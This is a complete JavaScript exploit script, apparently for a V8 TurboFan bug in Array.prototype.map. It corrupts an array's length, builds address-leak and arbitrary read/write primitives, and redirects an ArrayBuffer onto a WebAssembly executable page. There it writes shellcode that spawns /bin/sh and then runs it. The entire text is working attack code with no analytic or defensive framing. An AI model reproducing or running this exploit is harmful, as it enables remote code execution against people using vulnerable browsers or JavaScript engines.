function gc() { for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); }};
let f64 = new Float64Array(1);
let u32 = new Uint32Array(f64.buffer);
function d2u(v) {
  f64[0] = v;
  return u32;
}
function u2d(lo, hi) {
  u32[0] = lo;
  u32[1] = hi;
  return f64[0];
}
function hex(lo, hi) {
  if( lo == 0 ) {
    return ("0x" + hi.toString(16) + "00000000");
  }
  if( hi == 0 ) {
    return ("0x" + lo.toString(16));
  }
  return ("0x" + ('00000000'+hi.toString(16)).substr(8) +('00000000'+lo.toString(16)).substr(8));
}
const SIZE = 32 * 1024 * 1024;
// This call ensures that TurboFan won't inline array constructors.
Array(2**30);
// Set up a fast holey smi array, and generate optimized code.
let arr = [1, 2, ,,, 3];
// for rwx
let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 21, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 8, 95, 90, 51, 97, 100, 100, 105, 105, 0, 0, 10, 9, 1, 7, 0, 32, 1, 32, 0, 106, 11]);
let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
let f = wasm_mod.exports._Z3addii;
// global
let targetArray = null; 
let targetBuffer = null;
let bufferidx = null;
let leakarray = null;
let leakidx = null;
function func(v,idx) {
  if (idx > 0x1a){
    throw "err";
  }else if (idx == 0x1a) {
    targetArray = [1.1, 2.2, 3.3, 4.4, 5.5];
  }
  return v;
}
function mapping(a) {
  return a.map(func);
}
for(let i = 0; i < 100000; i++){
  mapping(arr);
}
// Now lengthen the array, but ensure that it points to a non-dictionary
// backing store.
arr.length = SIZE-1;
arr.fill(1,0);
arr.push(2);
arr.length += 500;
// Now, the non-inlined array constructor should produce an array with
// dictionary elements: causing a crash.
// readline();
try{
  gc();
  mapping(arr);
} catch {};
if (targetArray.length == 1072693248) {
  print("success");
}
// make addrof
leakarray = [0x4141,0x4242,{}];
for (let i = 0; i < 0x10000; i++) {
  if(targetArray[i] == u2d(0,0x4141)){
    if(targetArray[i+1] == u2d(0,0x4242)){
      leakidx = i; 
      break;
    }
  }
}
let addrof = function(obj){
  leakarray[0] = obj;
  return d2u(targetArray[leakidx]);
};
// make r/w
targetBuffer = new ArrayBuffer(0x1230);
for (let i = 0; i < 0x10000; i++) {
    if(targetArray[i] == u2d(0x1230,0)){
    bufferidx = i + 1;
    bufferbackup = targetArray[bufferidx];
    break;
    }
}
let read8 = function(address) {
  targetArray[bufferidx] = address;
  var tmp = new Uint32Array(targetBuffer);
  var re = [tmp[0], tmp[1]];
  return re; 
}
var wasm = addrof(wasm_mod);
var rwx = read8(u2d(wasm[0]+0xff,wasm[1]));
targetArray[bufferidx] = u2d(rwx[0],rwx[1]);
var dataview = new DataView(targetBuffer);
var shellcode = [ 0xb848686a, 0x6e69622f, 0x732f2f2f, 0xe7894850, 0x1697268, 0x24348101, 0x1010101, 0x6a56f631, 0x1485e08, 0x894856e6, 0x6ad231e6, 0x50f583b];
for(let i = 0; i < shellcode.length; i++) {
  dataview.setUint32(i * 4, shellcode[i], true);
}
f();
